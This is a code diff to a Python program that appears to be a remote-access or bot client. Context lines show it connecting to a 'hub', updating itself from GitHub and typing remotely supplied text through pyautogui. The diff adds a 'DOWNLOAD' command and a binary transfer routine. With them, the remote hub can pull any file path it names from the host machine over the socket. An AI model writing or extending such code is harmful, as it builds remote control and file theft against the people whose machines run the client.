@@ -634,6 +634,7 @@ def perform_self_update(remote_version, script_bytes):
 
 
 update_pending = False
+socket_lock = threading.Lock()
 
 def auto_update_monitor():
     """Monitor GitHub for updates in the background."""
@@ -649,6 +650,35 @@ def auto_update_monitor():
         except Exception:
             pass
         time.sleep(UPDATE_CHECK_INTERVAL)
+
+
+def send_binary_file(s, path):
+    """Reliable binary file transfer with structured header and thread safety."""
+    if not os.path.exists(path) or not os.path.isfile(path):
+        return False
+    try:
+        import struct
+        filesize = os.path.getsize(path)
+        filename = os.path.basename(path)
+        
+        # Professional binary header: 4-byte BE filesize + 1-byte filename length + filename bytes
+        header = struct.pack(">I B", filesize, len(filename)) + filename.encode('utf-8')
+        
+        with socket_lock:
+            s.sendall(b"TRANSFER_START" + header)
+            
+            with open(path, "rb") as f:
+                while True:
+                    chunk = f.read(8192)
+                    if not chunk:
+                        break
+                    s.sendall(chunk)
+            
+            time.sleep(0.5)
+            s.sendall(b"TRANSFER_END")
+        return True
+    except Exception:
+        return False
 
 
 def safe_copy(source, destination):
@@ -1314,6 +1344,9 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                                 pyautogui.typewrite(text)
                             except Exception:
                                 pass
+                    elif command.startswith('DOWNLOAD '):
+                        file_path = command.split(" ", 1)[1].strip()
+                        send_binary_file(client, file_path)
                     else:
                         pass
         except ConnectionResetError:
